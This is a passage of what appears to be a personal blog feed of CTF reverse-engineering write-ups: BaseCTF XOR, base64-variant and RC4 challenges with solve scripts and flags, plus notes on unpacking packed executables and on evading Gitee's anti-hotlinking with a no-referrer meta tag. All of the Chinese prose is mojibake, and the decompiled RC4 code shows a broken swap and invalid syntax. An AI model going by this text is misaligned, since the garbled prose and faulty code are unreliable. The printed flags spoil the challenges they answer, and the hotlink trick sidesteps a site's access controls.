    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>æ—¢ç„¶æ˜¯UPXé‚£å¿…é¡»å…ˆDIEæŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141119212.png" srcset="/img/loading.gif" lazyload><br>ä¸€çœ‹å°±ä¸å¯¹åŠ²ï¼Œupxæœ€å¤šåªè§è¿‡3.96çš„ï¼Œä¸è¿‡è¿™é‡Œå…ˆç”¨upxè‡ªå·±è„±ä¸€ä¸‹å¯ä»¥è„±<br>ç›´æ¥ç»§ç»­æŸ¥ï¼Œ64ä½æ— å£³ï¼Œè¿›å…¥ida<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141122619.png" srcset="/img/loading.gif" lazyload><br>æ˜æ˜¾çš„base64ç›´æ¥ï¼Œè§£å¯†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141123562.png" srcset="/img/loading.gif" lazyload><br>ç§’è§£<br>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>ç®€å•xorï¼Œç›´æ¥çœ‹idaï¼ŒæŸ¥ä½æ•°64ä½<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141128380.png" srcset="/img/loading.gif" lazyload><br>çœ‹ç äº†è§£ï¼Œå…³é”®å‡½æ•°keystreamå’Œencrptï¼Œè¾“å…¥é•¿åº¦ä¸º28ï¼Œstrã€v11ã€v12ã€v13åŠ èµ·æ¥æ­£å¥½28ä½,è¿™ä¸ªé¢˜ç›®è¦æ³¨æ„çš„å°±æ˜¯idaä¸­çš„cæ˜¯å°ç«¯åºçš„ä¼šæ‰€æœ‰çš„æ•°æ®éƒ½ä¼šåè½¬ï¼Œè€Œä¸”è®°å¾—ä½¿ç”¨åŸæ•°æ®ï¼Œä¸è¦ç”¨è½¬ä¹‰åçš„å®¹æ˜“å‡ºé”™<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141137462.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141138498.png" srcset="/img/loading.gif" lazyload><br>å†™pythonexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å®˜æ–¹wp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key</span>):<br>    key_box = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        key_box.append(key[i%<span class="hljs-number">3</span>] ^ i)<br>    <span class="hljs-keyword">return</span> key_box<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, key</span>):<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    key = key[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        flag += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i])<br>    <span class="hljs-keyword">return</span> flag<br><br>enc1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D0B2D2625050901&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;673D491E20317A24&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;34056E2E2508504D&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc4 = <span class="hljs-string">b&quot;\&quot;@;%&quot;</span><br>enc = enc1 + enc2 + enc3 + enc4<br><span class="hljs-built_in">print</span>(enc)<br><br>key = (<span class="hljs-number">7499608</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>key_box = key_stream(key)<br><span class="hljs-built_in">print</span>(key_box)<br><br>flag = decrypt(enc,key_box)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>ä»¥ä¸Šæ¥å°±æä¸ªbase64å•Šï¼Œæˆ‘æ„Ÿè§‰åƒï¼Œä½†æ˜¯æ²¡æœ‰ç¡®å®šï¼Œäºæ˜¯å°±çœ‹ä¸æ‡‚å‡½æ•°é‡Œé¢çš„å‡ ä¸ªå€¼ä¸ºä»€ä¹ˆæ²¡æœ‰æ•°äº†ï¼Œè¿™ä¹ˆå¥‡æ€ªï¼Œæœç„¶è¿˜æ˜¯æ²¡æœ‰å­¦è¿‡ï¼Œä¸è¿‡è¿™æ¬¡å¥½å¥½åˆ†æäº†ä¸€ç•ªä¸‹æ¬¡åº”è¯¥å°±å¯ä»¥ç¬é—´ç§’æ€äº†ï¼Œçœ‹é¢˜<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141107908.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬èƒ½äº†è§£é‡è¦å‡½æ•°ä¸ºEncodeï¼Œè¿›å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141108814.png" srcset="/img/loading.gif" lazyload><br>äº†è§£äº†è¿™ä¸ªæ˜¯base64åæˆ‘ä»¬è¿˜è¦å’Œæºä»£ç åˆ†æï¼Œå‘ç°å­˜åœ¨ä¸åŒ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141109133.png" srcset="/img/loading.gif" lazyload><br>äº†è§£äº†è¿™ä¸­é—´æœ‰ä¸ªå¼‚æˆ–çš„æ“ä½œï¼Œååˆ†ç®€å•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">do</span><br>&#123;<br>    *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br>    ++v8;<br>&#125;<br><span class="hljs-keyword">while</span> ( v8 != v5 );<br></code></pre></td></tr></table></figure><p>ç›´æ¥cyberChefæ¢è¡¨åŠ å¼‚æˆ–åŒé‡è§£å¯†å®Œæˆï¼Œ<br>è´´ä¸ªæ— å¹¿å‘Šçš„<a href="https://cyberchef.org/">cyberchef</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141116043.png" srcset="/img/loading.gif" lazyload><br>å¾—åˆ°flag<br>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p><h3 id="Ezpy"><a href="#Ezpy" class="headerlink" title="Ezpy"></a>Ezpy</h3><p>é¦–å…ˆå°±æ˜¯æŒ‰ç…§æƒ¯ä¾‹ï¼Œæ–‡ä»¶å±æ€§æŸ¥è¯¢ï¼Œç›´æ¥dieï¼Œä¹Ÿå¯ä»¥ç”¨DEIDæˆ–è€…peexamå»æŸ¥ã€‚ä¸è¿‡dieå¾ˆå…¨é¢ï¼Œä½†æ˜¯ç¡®å®å¾ˆå¡<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151024364.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409151027465.png" srcset="/img/loading.gif" lazyload><br>çœ‹é¢˜ç›®æˆ‘ä»¬å°±çŸ¥é“æ˜¯ä¸€ä¸ªè¿™æ˜¯ä¸€ä¸ªpythoné¢˜ç›®ï¼Œå…¶å®è¿˜æœ‰ä¸€ä¸ªåŠæ³•ï¼Œpythonexeå›¾æ ‡å¤§å¤šéƒ½æ˜¯è¿™ä¸ªï¼Œçœ‹DIEç«Ÿç„¶æ²¡æœ‰æ˜¾ç¤ºæ˜¯ä»€ä¹ˆè½¯ä»¶æ‰“åŒ…çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥è¯•è¯•pyinstxtractor<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151029748.png" srcset="/img/loading.gif" lazyload><br>è¿™å°±æ˜¯è§£åŒ…è¿‡ç¨‹ï¼Œå’Œä½¿ç”¨æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­pyinstxtractorä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå¯¼å‡ºåŒ…ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°è§£åŒ…è½¯ä»¶å¯¹pythonç‰ˆæœ¬çš„éœ€æ±‚ï¼Œä½ æœ‰æƒ³æ³•çš„å¯ä»¥ç”¨<a href="https://zhuanlan.zhihu.com/p/36402791">pyenv</a>å»é™¤æ‰è¿™ä¸ªé”™è¯¯ï¼Œå…¶å®æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä¸»è¦åœ¨äºåé¢pycæ–‡ä»¶ä¸­çš„magic number<br>è¿›å…¥è§£åŒ…æ–‡ä»¶å¤¹ï¼Œä¼šå‘ç°èµ„æºæ–‡ä»¶å¤¹å’Œå¤§é‡çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæˆ‘ä»¬åªå–æ•Œå°†é¦–çº§ï¼Œç›´æ¥çœ‹åˆ°ä¸€ä¸ªæ²¡æœ‰åç¼€çš„é¢˜ç›®åŒåè½¯ä»¶Ezpy<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151035853.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªå…¶å®æ˜¯pycä¹Ÿå°±æ˜¯pythonçš„å­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦çš„å°±æ˜¯è¿™ä¸ªï¼Œpythonå¤§éƒ¨åˆ†å°±æ˜¯åˆ©ç”¨pycæ¥è¿›è¡Œåç¼–è¯‘ï¼Œæˆ‘ä»¬æ‰€çŸ¥çš„åç¼–è¯‘å·¥å…·æœ‰<a href="https://www.52pojie.cn/thread-1854345-1-1.html">pycdc</a>(pycdcä¼šæœ‰äº›éº»çƒ¦ï¼Œä¸è¿‡æ„Ÿè§‰å¼ºå¤§äº›ï¼Œå› ä¸ºæ˜¯åç¼–è¯‘éš¾å…ä¼šå‡ºç°é”™è¯¯ï¼Œè€Œè¿™ä¸ªçš„é”™è¯¯å‡ºç°ä¼šæ›´åŠ ç¨€å°‘)å’Œ<a href="https://pypi.com.cn/project/uncompyle6/">uncompyle6</a>è¿™ä¸ªçš„å®‰è£…éå¸¸çš„ç®€å•ï¼Œæœ‰pythonå°±è¡Œ(ä½†æ˜¯åªæ”¯æŒ3.8åŠä¸€ä¸‹çš„ï¼Œä½œè€…å¤§å¤§ä¸æ›´3.9äº†)<br>å¥½ç°åœ¨æˆ‘ä»¬å¼€å§‹æ‰§è¡Œä¸€ä¸‹pycdc(è®°å¾—æ”¹Ezpyåç¼€åï¼Œpycdcå°±æ²¡å…³ç³»)ï¼Œå°±ä¼šå‘ç°æƒŠå–œäº†ï¼Œå¤±è´¥äº†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151042742.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªå°±æ˜¯æˆ‘è¯´çš„magicnumberçš„é—®é¢˜è§£å†³åŠæ³•ä¹Ÿéå¸¸ç®€å•ï¼Œä¸€èˆ¬è§£åŒ…åéƒ½ä¼šè‡ªå¸¦ä¸€ä¸ªstructæ–‡ä»¶ã€‚ç”¨å­—èŠ‚æŸ¥çœ‹å™¨æ‰“å¼€æ¨è<a href="https://www.52pojie.cn/thread-1863194-1-1.html">010</a>ï¼Œä¸è¿‡å¤§éƒ¨åˆ†éƒ½æ˜¯æŸåçš„æˆ‘åœ¨è¿™è´´ä¸€ä¸ª<a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">magicnumber</a>ã€‚<br>æ³¨æ„å¤§å°ç«¯åºï¼Œç…§ç€æ”¹å°±è¡Œã€‚å»ºè®®æ˜¯åå…­ä¸ªå­—èŠ‚ï¼Œç•™ç©ºç•™ä¸‹æ ˆåŒº<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151053398.png" srcset="/img/loading.gif" lazyload><br>ç„¶åç›´æ¥åç¼–è¯‘(ä¹Ÿå¯ä»¥ç”¨ç½‘ç»œç‰ˆçš„)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_Sbox</span>(<span class="hljs-params">seed</span>):<br>    k_b = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ <span class="hljs-built_in">ord</span>(seed[i % <span class="hljs-built_in">len</span>(seed)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k_b[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyStream</span>(<span class="hljs-params">text, Sbox</span>):<br>    s = Sbox.copy()<br>    (i, j) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    k = [<br>        <span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(text)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        k[r] = s[t] ^ Key.keykey[r % <span class="hljs-built_in">len</span>(Key.keykey)]<br>    <span class="hljs-keyword">return</span> k<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">text, seed</span>):<br>    Sbox = init_Sbox(seed)<br>    key = KeyStream(text, Sbox)<br>    enc = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ text[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br>enc = <span class="hljs-string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input Your flag:&#x27;</span>)<br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(flag)<br>flag = Encrypt(flag, Key.key)<br><span class="hljs-keyword">if</span> flag != enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s not flag!&quot;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are right!&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„rc4<br>ç›´æ¥ç»™å‡ºexp</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯æ¶çš„giteeåƒæ‰å¤–é“¾äº†</title>
    <link href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/"/>
    <url>/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/</url>
    
    <content type="html"><![CDATA[<h3 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h3><p>è¿™æ˜¯è¿™ä¸ªåšå®¢æœ€å¼€å§‹çš„æ•…äº‹ï¼Œæˆ‘æƒ³è¦ç”¨giteeåšä¸€ä¸ªå›¾åºŠï¼Œå½“æ—¶æˆ‘æ€ä¹ˆä¹Ÿæ²¡æƒ³åˆ°giteeå±…ç„¶æ‹’ç»æ‰å¤–é“¾çš„è¯·æ±‚äº†ï¼Œå°±åƒè¿™æ ·<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>ä½†æ˜¯åå¤å°è¯•æˆ‘ä»¬å‘ç°äº†ä¸€ä¸‹è¿”å›å€¼</p><h3 id="é˜²ç›—é“¾"><a href="#é˜²ç›—é“¾" class="headerlink" title="é˜²ç›—é“¾"></a>é˜²ç›—é“¾</h3><p>è¦å®ç°é˜²ç›—é“¾ï¼Œå°±éœ€è¦çŸ¥é“å›¾ç‰‡çš„è¯·æ±‚æ˜¯ä»å“ªé‡Œå‘å‡ºçš„ã€‚å¯ä»¥å®ç°è¿™ä¸€åŠŸèƒ½çš„æœ‰è¯·æ±‚å¤´ä¸­çš„originå’Œrefererã€‚originåªæœ‰åœ¨XHRè¯·æ±‚ä¸­æ‰ä¼šå¸¦ä¸Šï¼Œæ‰€ä»¥å›¾ç‰‡èµ„æºåªèƒ½å€ŸåŠ©referer</p><p>é€šè¿‡åˆ¤æ–­è¯·æ±‚çš„refererï¼Œå¦‚æœè¯·æ±‚æ¥æºä¸æ˜¯æœ¬ç«™å°±è¿”å›302</p><h4 id="ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š"><a href="#ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š" class="headerlink" title="ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š"></a>ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼š</h4><ul><li>é¦–å…ˆè¯·æ±‚æ­£å¸¸çš„å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›200ï¼Œè€Œæ˜¯302é‡å®šå‘ï¼Œå…¶ä¸­å“åº”å¤´ä¸­çš„locationå°±æ˜¯è¦é‡å®šå‘å»å‘çš„åœ°å€</li><li>æ¥ç€æµè§ˆå™¨ä¼šè‡ªåŠ¨è¯·æ±‚è¿™ä¸ªlocationï¼Œå¹¶ç”¨è¿™ä¸ªè¿”å›ç»“æœä»£æ›¿ç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¿”å›å†…å®¹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="å¦‚ä½•ç ´è§£é˜²ç›—é“¾"><a href="#å¦‚ä½•ç ´è§£é˜²ç›—é“¾" class="headerlink" title="å¦‚ä½•ç ´è§£é˜²ç›—é“¾"></a>å¦‚ä½•ç ´è§£é˜²ç›—é“¾</h4><p>æƒ³è®©giteeä¸çŸ¥é“æˆ‘åœ¨ç›—ç”¨ï¼Œå°±ä¸èƒ½è®©ä»–å‘ç°è¯·æ±‚çš„æ¥æºæ˜¯ç¬¬ä¸‰æ–¹ï¼Œåªè¦æŠŠrefererè—èµ·æ¥å°±å¥½</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥éª—è¿‡giteeï¼Œç”¨butterflyå’Œyiliaçš„ä¸»é¢˜å¯ä»¥ä¸Šç½‘æœæœéƒ½æœ‰è®²ï¼Œfluidè¿™ç±»çš„ä¸åŒï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè¦è®²ä¸‹è¿›é˜¶çš„ä»£ç æ³¨å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>æŒ‰ä¸Šé¢è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºheaderå¤´å‰çš„ä»£ç æ¥æ³¨å…¥ï¼Œéª—è¿‡giteeä½¿å›¾ç‰‡æ˜¾ç°<br>ä¸‹é¢æ˜¯æˆ‘çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æ³¨è§£ï¼š</p><meta name="referrer" content="no-referrer" /> æŒ‡å®šäº† "no-referrer" çš„å†…å®¹ï¼Œæ„å‘³ç€æµè§ˆå™¨åœ¨å‘é€è¯·æ±‚æ—¶ä¸ä¼šåŒ…å«ä»»ä½•å¼•ç”¨æ¥æºä¿¡æ¯ã€‚æ¢å¥è¯è¯´ï¼Œå½“ç”¨æˆ·ä»å½“å‰ç½‘é¡µè·³è½¬åˆ°å…¶ä»–é¡µé¢æ—¶ï¼Œæ–°é¡µé¢æ¥æ”¶åˆ°çš„è¯·æ±‚ä¸­å°†ä¸åŒ…å«è¿™ä¸ªè·³è½¬å‰çš„é¡µé¢åœ°å€<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤</title>
    <link href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/FSG%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h3 id="MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤"><a href="#MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤" class="headerlink" title="MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤"></a>MSGè„±å£³è¿‡ç¨‹ä¸­çš„IATä¿®å¤</h3><p>è¿›è¡Œæ‰‹åŠ¨æŸ¥æ‰¾å’ŒIATä¿®å¤<br>æ‰¾å¯ä»¥åœ¨åŠ¨æ€è¿æ¥åº“ä¸­æŸ¥å¾—åˆ°çš„call<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016001.png" srcset="/img/loading.gif" lazyload><br>åœ¨å‘½ä»¤è¡Œä¸­æ•²425210ç„¶åæŸ¥è¿æ¥åº“å‡½æ•°<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016599.png" srcset="/img/loading.gif" lazyload><br>å‘ä¸Šå‘ä¸‹æŸ¥æ‰¾ä¸º0çš„æ•°å€¼(åˆ†å‰²å¤„)<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016253.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016865.png" srcset="/img/loading.gif" lazyload><br>æ‰‹åŠ¨ä¿®æ”¹RVAå’Œsizeçš„å€¼<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016959.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aspè„±å£³</title>
    <link href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/asp%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>aspè„±å£³æ—¶åˆ©ç”¨</p><h4 id="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"><a href="#æ¨¡æ‹Ÿè·Ÿè¸ªæ³•" class="headerlink" title="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"></a>æ¨¡æ‹Ÿè·Ÿè¸ªæ³•</h4><p>åˆ©ç”¨tcå‘½ä»¤è·Ÿè¸ª<br><img src="http://gitee.com/fogpost/photo/raw/master/image12.png" srcset="/img/loading.gif" lazyload><br>æŸ¥æ‰¾å¸¦æœ‰sfxå’Œè¾“å…¥è¡¨çš„å­—æ®µ<br><img src="http://gitee.com/fogpost/photo/raw/master/image-1.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸ªæ–¹æ³•ç”±äºæ—¶ç¨‹åºè‡ªåŠ¨è¿›è¡Œçš„æ‰€ä»¥ååˆ†ç¼“æ…¢ä¸å»ºè®®ç”¨  </p><h4 id="SFXæ³•"><a href="#SFXæ³•" class="headerlink" title="SFXæ³•"></a>SFXæ³•</h4><p><img src="http://gitee.com/fogpost/photo/raw/master/image-3.png" srcset="/img/loading.gif" lazyload><br>è‡ªåŠ¨æŠµè¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/image-4.png" srcset="/img/loading.gif" lazyload></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>å·§å¦™è„±å£³æ³•<br><img src="http://gitee.com/fogpost/photo/raw/master/image-5.png" srcset="/img/loading.gif" lazyload><br>at GetVersion  </p><p>ä¸‹ç‰ˆæœ¬æ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/image-6.png" srcset="/img/loading.gif" lazyload><br>åœ¨retnå¤„ä¸‹æ–­ç‚¹<br>å•æ­¥F8ä¹‹ååˆ°æ‰“OEPä¹‹åå‘å‰æ‰¾OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122015500.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEcompactè„±å£³</title>
    <link href="/2024/09/12/PEcompact/"/>
    <url>/2024/09/12/PEcompact/</url>
    
    <content type="html"><![CDATA[<h3 id="PEcompactè„±å£³"><a href="#PEcompactè„±å£³" class="headerlink" title="PEcompactè„±å£³"></a>PEcompactè„±å£³</h3><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017434.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>3<br>BP VirtualFree<br>F9åˆ°è¾¾å–æ¶ˆæ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017793.png" srcset="/img/loading.gif" lazyload><br>è¿”å›åˆ°ç”¨æˆ·ä»£ç alt+f9<br>æŸ¥æ‰¾PUSH 8000<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017787.png" srcset="/img/loading.gif" lazyload><br>ç„¶åå•æ­¥åˆ°è¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017628.png" srcset="/img/loading.gif" lazyload></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>ä¸¤æ¬¡shift+f9åˆ°è¾¾<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017209.png" srcset="/img/loading.gif" 